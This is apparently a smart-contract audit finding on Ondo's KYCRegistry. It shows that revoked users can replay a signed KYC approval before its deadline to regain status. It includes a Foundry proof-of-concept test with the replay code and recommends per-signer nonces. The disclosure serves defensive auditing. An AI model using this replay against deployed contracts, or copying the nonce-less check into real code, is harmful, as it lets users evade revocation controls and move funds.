# Original link
https://github.com/code-423n4/2023-01-ondo-findings/issues/187
# Lines of code

https://github.com/code-423n4/2023-01-ondo/blob/main/contracts/cash/kyc/KYCRegistry.sol#L79-L112


# Vulnerability details

## Impact
The KYCRegistry contract uses signatures to grant KYC status to the users using the `addKYCAddressViaSignature` function.

However this function does not prevent replaying of signatures in the case where KYC status was revoked of a user. 

```solidity
  function addKYCAddressViaSignature( ... ) external {
    require(v == 27 || v == 28, "KYCRegistry: invalid v value in signature");
    require(
      !kycState[kycRequirementGroup][user],
      "KYCRegistry: user already verified"
    );
    require(block.timestamp <= deadline, "KYCRegistry: signature expired");
    bytes32 structHash = keccak256(
      abi.encode(_APPROVAL_TYPEHASH, kycRequirementGroup, user, deadline)
    );

    bytes32 expectedMessage = _hashTypedDataV4(structHash);

    address signer = ECDSA.recover(expectedMessage, v, r, s);
    _checkRole(kycGroupRoles[kycRequirementGroup], signer);

    kycState[kycRequirementGroup][user] = true;
    // ...
  }
```

This function could be exploited in the case when these conditions are true:
- KYC status was granted to user using a signature with validity upto `deadline`.
- Before the `deadline` was passed, the KYC status of user was revoke using the `removeKYCAddresses` function.

In the above mentioned conditions the malicious user can submit the original signature again to the `addKYCAddressViaSignature` function which will forcefully grant the KYC status to malicious user again.

It should also be noted that due to this bug until the deadline has been passed the privileged accounts cannot revoke the KYC status of a KYC granted user. This can result in unwanted moving of funds by the user in/out of Ondo protocol.

## Proof of Concept
Test file created `BugTest.t.sol` and was run by `forge test --mp ./forge-tests/BugTest1.t.sol `

```solidity
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "contracts/cash/kyc/KYCRegistry.sol";

contract SanctionsList {
    function isSanctioned(address) external pure returns (bool) {
        return false;
    }
}
struct KYCApproval {
    uint256 kycRequirementGroup;
    address user;
    uint256 deadline;
}

contract BugTest1 is Test {
    bytes32 APPROVAL_TYPEHASH;
    bytes32 DOMAIN_SEPARATOR;
    KYCRegistry registry;

    address admin;
    address kycAgent;
    uint256 kycAgentPrivateKey = 0xB0B;
    address attacker;

    function setUp() public {
        admin = address(0xad);
        attacker = address(0xbabe);
        kycAgent = vm.addr(kycAgentPrivateKey);
        registry = new KYCRegistry(admin, address(new SanctionsList()));
        APPROVAL_TYPEHASH = registry._APPROVAL_TYPEHASH();
        DOMAIN_SEPARATOR = registry.DOMAIN_SEPARATOR();
    }

    function test_bug() public {
        uint256 kycGroup = 1;
        bytes32 kycGroupRole = "0x01";
        vm.prank(admin);
        registry.assignRoletoKYCGroup(kycGroup, kycGroupRole);
        vm.prank(admin);
        registry.grantRole(kycGroupRole, kycAgent);
        vm.stopPrank();

        uint256 deadline = block.timestamp + 1 days;
        KYCApproval memory approval = KYCApproval({
            kycRequirementGroup: kycGroup,
            user: attacker,
            deadline: deadline
        });
        bytes32 digest = getTypedDataHash(approval);
        // KYC approval got signed with validity of 1 day
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(kycAgentPrivateKey, digest);

        assertEq(registry.kycState(kycGroup, attacker), false);
        assertEq(registry.getKYCStatus(kycGroup, attacker), false);

        vm.prank(attacker);
        registry.addKYCAddressViaSignature(kycGroup, attacker, deadline, v, r, s);

        assertEq(registry.kycState(kycGroup, attacker), true);
        assertEq(registry.getKYCStatus(kycGroup, attacker), true);

        address[] memory toBeRemovedAddrs = new address[](1);
        toBeRemovedAddrs[0] = attacker;
        // KYC approval was removed
        vm.prank(kycAgent);
        registry.removeKYCAddresses(kycGroup, toBeRemovedAddrs);
        vm.stopPrank();
        assertEq(registry.getKYCStatus(kycGroup, attacker), false);

        // KYC approval was granted again by replaying the original signature
        vm.prank(attacker);
        registry.addKYCAddressViaSignature(kycGroup, attacker, deadline, v, r, s);
        assertEq(registry.kycState(kycGroup, attacker), true);
        assertEq(registry.getKYCStatus(kycGroup, attacker), true);
    }

    function getStructHash(KYCApproval memory _approval) internal view returns (bytes32) {
        return keccak256(abi.encode(APPROVAL_TYPEHASH, _approval.kycRequirementGroup, _approval.user, _approval.deadline));
    }

    function getTypedDataHash(KYCApproval memory _approval) public view returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, getStructHash(_approval)));
    }
}
```

## Tools Used
Manual review

## Recommended Mitigation Steps
A nonce mapping for message signers can be maintained the value of which can be incremented for every successful signature validation.
```solidity
mapping(address => uint) private nonces;
``` 
A more detailed usage example can be found in OpenZeppelin's EIP-2612 implementation.
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Permit.sol#L90